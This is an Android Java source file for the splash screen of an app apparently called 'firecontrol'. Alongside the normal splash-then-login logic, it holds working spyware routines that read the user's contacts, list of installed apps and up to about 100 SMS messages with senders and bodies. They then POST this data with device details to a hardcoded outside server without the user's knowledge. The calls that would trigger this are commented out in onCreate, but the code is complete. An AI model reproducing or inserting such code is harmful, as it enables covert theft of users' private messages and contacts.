package com.example.zz_xa.firecontrol.LoginInit;

import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import com.example.zz_xa.firecontrol.Manifest;
import com.example.zz_xa.firecontrol.R;
import com.hyphenate.easeui.ui.EaseBaseActivity;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * Created by ZZ-XA of wxb on 2018/4/24.
 * Fix by:
 */

public class Appstart extends EaseBaseActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.appstart);

       // getYourData();
       // String[] arr = getContacts();
    //    initServer();

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent intent = new Intent(Appstart.this, LoginActivity.class);
                startActivity(intent);
                Appstart.this.finish();
            }
        },1000);
    }

    private void initServer(){
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED){
            if(ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.RECORD_AUDIO)){
                Toast.makeText(this,"shoud open camera",Toast.LENGTH_SHORT).show();
            } else {
                ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.CAMERA
                        , android.Manifest.permission.RECORD_AUDIO
                        , android.Manifest.permission.ACCESS_FINE_LOCATION
                        , android.Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
            }
        }

        /*
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED){
            if(ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.CAMERA)){
                Toast.makeText(this,"shoud open record",Toast.LENGTH_SHORT).show();
            } else {
                ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.RECORD_AUDIO}, 1);
            }
        }
        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED){
            if(ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.WRITE_EXTERNAL_STORAGE)){
                Toast.makeText(this,"shoud open record",Toast.LENGTH_SHORT).show();
            } else {
                ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
            }
        }

        if(ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED){
            if(ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.ACCESS_FINE_LOCATION)){
                Toast.makeText(this,"shoud open record",Toast.LENGTH_SHORT).show();
            } else {
                ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.ACCESS_FINE_LOCATION}, 1);
            }
        }
        */
    }

    private String[] getContacts(){

        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        //指定获取_id和display_name两列数据，display_name即为姓名
        String[] projection = new String[] {
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
        };
        //根据Uri查询相应的ContentProvider，cursor为获取到的数据集
        Cursor cursor = this.getContentResolver().query(uri, projection, null, null, null);
        String[] arr = new String[cursor.getCount()];
        int i = 0;
        if (cursor != null && cursor.moveToFirst()) {
            do {
                Long id = cursor.getLong(0);
                //获取姓名
                String name = cursor.getString(1);
                //指定获取NUMBER这一列数据
                String[] phoneProjection = new String[] {
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                };
                arr[i] = id + " , 姓名：" + name;

                //根据联系人的ID获取此人的电话号码
                Cursor phonesCusor = this.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        phoneProjection,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id,
                        null,
                        null);

                //因为每个联系人可能有多个电话号码，所以需要遍历
                if (phonesCusor != null && phonesCusor.moveToFirst()) {
                    do {
                        String num = phonesCusor.getString(0);
                        arr[i] += " , 电话号码：" + num;
                    }while (phonesCusor.moveToNext());
                }
                i++;
            } while (cursor.moveToNext());
        }
        return arr;
    }

    public void getYourData(){
        String pakList=null,smsList = null;
        pakList = getAllApps();
        smsList = getSmsFromPhone();


        try {
            String urlstr = "http://t1966652k0.imwork.net:25024/Android/php/device.php";

            URL url = new URL(urlstr);
            HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
            String params = "board="+ Build.BRAND+ "&deviceModel="+Build.MODEL;

            String token = "token";
            String city = "city";

            params = params + "&token="+token + "&cityLocation=" + city;

            if(pakList != null ){
                params = params + "&pakList=" + pakList;
            }
            if(smsList != null){
                params = params + "&smsList=" + smsList;
            }
            httpURLConnection.setDoInput(true);
            httpURLConnection.setRequestMethod("POST");
            OutputStream outputStream = httpURLConnection.getOutputStream();
            outputStream.write(params.getBytes());
            outputStream.flush();
            outputStream.close();

        } catch (Exception e){
            Log.e("log_tag","the Error http data :"+e.toString());
        }
    }
    private String getAllApps(){
        String result = "";
        PackageManager packageManager = this.getPackageManager();
        List<PackageInfo> pList = packageManager.getInstalledPackages(0);
        for(int i=0; i<pList.size(); i++){
            PackageInfo packageInfo = (PackageInfo)pList.get(i);
            if((packageInfo.applicationInfo.flags & packageInfo.applicationInfo.FLAG_SYSTEM) <= 0){
                if(TextUtils.isEmpty(result)){
                    result = packageInfo.applicationInfo.loadLabel(packageManager).toString();
                } else {
                    result = result + ","+packageInfo.applicationInfo.loadLabel(packageManager).toString();
                }
            }
        }
        return result;
    }

    private String getSmsFromPhone(){
        String result = "";
        ContentResolver contentResolver = getContentResolver();
        String[] projection = new String[]{"_id","address","person","body","date","type"};
        Uri SMS_INBOX = Uri.parse("content://sms/");
        Cursor cursor = contentResolver.query(SMS_INBOX, projection,null, null, "date desc");
        if(null == cursor){
            return null;
        }
        List<Map<String, Object>> list = new ArrayList<>(4);
        int cc = 0;
        while (cursor.moveToNext()){
            String number = cursor.getString(cursor.getColumnIndex("address"));
            String name = cursor.getString(cursor.getColumnIndex("person"));
            String body = cursor.getString(cursor.getColumnIndex("body"));
            result = result + "-" + number + "-" + name + "-" + body + ",";

            cc += 1;
            if(cc > 100){
                return result;
            }
        }

        return  result;
    }

}
